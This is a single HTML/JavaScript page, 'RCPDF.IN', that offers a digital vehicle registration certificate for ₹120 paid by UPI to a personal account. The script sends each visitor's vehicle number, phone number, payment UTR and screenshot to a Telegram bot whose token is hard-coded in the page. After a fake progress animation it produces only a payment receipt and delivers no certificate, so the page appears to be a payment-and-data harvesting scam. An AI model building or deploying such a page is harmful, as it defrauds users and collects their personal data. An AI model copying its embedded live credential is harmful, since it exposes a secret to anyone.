<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - All Services</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        body { background: linear-gradient(180deg, #FF9933 0%, #ffffff 40%, #ffffff 60%, #138808 100%); background-attachment: fixed; color: #000; overflow-x: hidden; min-height: 100vh; }
        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; width: 28px; z-index: 1001; }
        .menu-btn div { width: 100%; height: 3px; background: var(--ind-blue); border-radius: 2px; }
        .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }
        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; box-shadow: 5px 0 15px rgba(0,0,0,0.2); overflow-y: auto; }
        .sidebar.active { left: 0; }
        .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f8f9fa; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; border: 1px solid #ddd; cursor:pointer; text-align: left; }
        .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
        .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
        .ind-strip img { width: 30px; margin-bottom: 4px; }
        #vehInput { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
        #mob, #fatherName, #utrInput { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; }
        .neon-box { position: relative; padding: 4px; border-radius: 15px; background: #000; overflow: hidden; margin-bottom: 20px; }
        .neon-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000); animation: rotateRGB 3s linear infinite; }
        .inner-box { position: relative; background: #fff; border-radius: 11px; padding: 15px; z-index: 1; }
        @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .neon-btn { position: relative; background: #000; color: #fff; font-size: 16px; font-weight: 900; padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer; text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .neon-btn::after { content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        .road { width: 85%; height: 4px; background: #333; position: relative; margin-top: 20px; }
        .car { font-size: 45px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); }
        .pct { font-size: 45px; font-weight: 900; color: #ff0066; }
        .promo-container { margin-bottom: 15px; background: #eef2ff; padding: 12px; border-radius: 12px; border: 1.5px dashed var(--ind-blue); display: flex; justify-content: space-between; align-items: center; }
        .promo-apply-btn { background: var(--ind-blue); color: #fff; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .history-card { background: #f8f9fa; padding: 10px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; text-align: left; font-size: 12px; }
        .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; background: rgba(0, 128, 0, 0.98); }
    </style>
</head>
<body>

    <div class="header">
        <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:24px;" onclick="location.reload()">🏠</button>
    </div>

    <div class="sidebar" id="side">
        <h3 style="margin-bottom:15px; color:var(--ind-blue);">Order History</h3>
        <div id="hList"></div>
        <hr style="margin:20px 0;">
        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'"><i class="fas fa-shield-alt"></i> Insurance</button>
        <button class="s-link" onclick="toggleM()" style="background:#ffdddd;">Close</button>
    </div>

    <div id="successOverlay" class="overlay"><h1>😊</h1><h2>Done!</h2><p>Request Bhej di gayi hai.</p></div>

    <div class="card">
        <div id="p1">
            <h2 style="margin-bottom:15px; color: var(--ind-blue);">Download Digital RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <button class="btn" onclick="go2()">CONTINUE</button>
        </div>

        <div id="p2" style="display:none;">
            <button class="neon-btn" onclick="pay()"></button>
            <div style="background:#fff; padding:10px; border-radius:15px; margin-bottom:15px; border:1px solid #ddd; display:inline-block;">
                <img id="qr" src="" width="160">
                <p id="amtLabel" style="font-size:12px; font-weight:bold; margin-top:5px;">PAY ₹120</p>
            </div>
            <div class="promo-container">
                <div style="text-align:left;"><small>Offer:</small><br><b id="pCodeText" style="color:var(--primary);">WELCOME10</b></div>
                <button id="pBtn" class="promo-apply-btn" onclick="handlePromo()">APPLY</button>
            </div>
            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
            <div class="neon-box">
                <div class="inner-box">
                    <input type="text" id="utrInput" placeholder="12 DIGIT UTR NO" maxlength="12">
                    <input type="file" id="ss" accept="image/*" style="width:100%; margin-top:10px;">
                    <p style="font-size:11px; margin-top:5px; color:#555;">Upload Screenshot / UTR (Any one mandatory)</p>
                </div>
            </div>
            <button class="btn" onclick="submit()">Verify & Download</button>
        </div>
    </div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
    </div>

    <script>
        const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
        const T_CHAT_ID = "5600045707";
        let currentAmt = 120.00;
        let appliedPromo = "NONE";

        function toggleM() { 
            const list = document.getElementById('hList');
            const history = JSON.parse(localStorage.getItem('rc_hist') || "[]");
            list.innerHTML = history.length ? "" : "No orders yet.";
            history.forEach(h => {
                list.innerHTML += `<div class="history-card"><b>${h.veh}</b><br>Amt: ₹${h.amt} | ID: ${h.tx}<br><small>${h.date}</small></div>`;
            });
            document.getElementById('side').classList.toggle('active'); 
        }

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = v.substring(0,2) + (v.length>2?"-"+v.substring(2,4):"") + (v.length>4?"-"+v.substring(4,6):"") + (v.length>6?"-"+v.substring(6,10):"");
            i.value = out;
        }

        function updateQR(amt) {
            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${amt.toFixed(2)}&cu=INR&tn=RC_DOWNLOAD`;
            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(upi);
            document.getElementById('amtLabel').innerText = `PAY ₹${amt}`;
        }

        function handlePromo() {
            const btn = document.getElementById('pBtn');
            if(appliedPromo === "NONE") {
                currentAmt = 108.00; appliedPromo = "WELCOME10";
                btn.innerText = "REMOVE"; btn.style.background = "red";
            } else {
                currentAmt = 120.00; appliedPromo = "NONE";
                btn.innerText = "APPLY"; btn.style.background = "var(--ind-blue)";
            }
            updateQR(currentAmt);
        }

        function go2() { 
            if(document.getElementById('vehInput').value.length < 8) return alert("Enter valid Vehicle No");
            updateQR(currentAmt);
            document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
        }

        function pay() { window.location.href = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${currentAmt.toFixed(2)}&cu=INR&tn=RC_DOWNLOAD`; }

        async function sendT(f, tx, utr, d) {
            let fd = new FormData();
            const cap = `🚀 *NEW ORDER*\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n💰 *Amt:* ₹${currentAmt}\n🎟️ *Promo:* ${appliedPromo}\n🔢 *UTR:* ${utr || 'N/A'}\n📱 *Mob:* ${document.getElementById('mob').value}\n🆔 *TxID:* \`${tx}\`\n📅 *Date:* ${d}`;
            fd.append("chat_id", T_CHAT_ID); fd.append("parse_mode", "Markdown");
            if(f) { fd.append("photo", f); fd.append("caption", cap); } else { fd.append("text", cap); }
            const api = f ? "sendPhoto" : "sendMessage";
            await fetch(`https://api.telegram.org/bot${T_TOKEN}/${api}`, { method:"POST", body:fd });
        }

        function submit() {
            const s = document.getElementById('ss').files[0];
            const u = document.getElementById('utrInput').value;
            if(document.getElementById('mob').value.length < 10 || (!s && !u)) return alert("Details Missing!");

            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(async () => {
                p += 2; document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.85) + "%";
                if(p === 60) {
                    const txId = "RC" + Date.now().toString().slice(-8);
                    const date = new Date().toLocaleString();
                    let hist = JSON.parse(localStorage.getItem('rc_hist') || "[]");
                    hist.unshift({ veh: document.getElementById('vehInput').value, tx: txId, amt: currentAmt, date: date });
                    localStorage.setItem('rc_hist', JSON.stringify(hist));
                    await sendT(s, txId, u, date);
                    makePDF(txId, u, date);
                }
                if(p >= 100) { clearInterval(iv); document.getElementById('load').style.display='none'; document.getElementById('successOverlay').style.display='flex'; setTimeout(()=>location.reload(), 3000); }
            }, 80);
        }

        function makePDF(tx, utr, dt) {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            doc.setFillColor(0, 51, 153); doc.rect(0, 0, 210, 40, 'F');
            doc.setTextColor(255); doc.setFontSize(24); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
            
            doc.setTextColor(0); doc.setFontSize(12);
            let y = 60;
            const rows = [
                ["Transaction ID:", tx], ["UTR Number:", utr || "N/A"],
                ["Vehicle Number:", document.getElementById('vehInput').value],
                ["Mobile Number:", document.getElementById('mob').value],
                ["Date & Time:", dt], ["Promo Applied:", appliedPromo],
                ["Total Paid:", "INR " + currentAmt.toFixed(2)]
            ];
            rows.forEach(r => {
                doc.setFont("helvetica", "bold"); doc.text(r[0], 20, y);
                doc.setFont("helvetica", "normal"); doc.text(r[1], 80, y);
                doc.line(20, y+2, 190, y+2); y += 15;
            });
            doc.save(`Receipt_${tx}.pdf`);
        }
    </script>
</body>
</html>
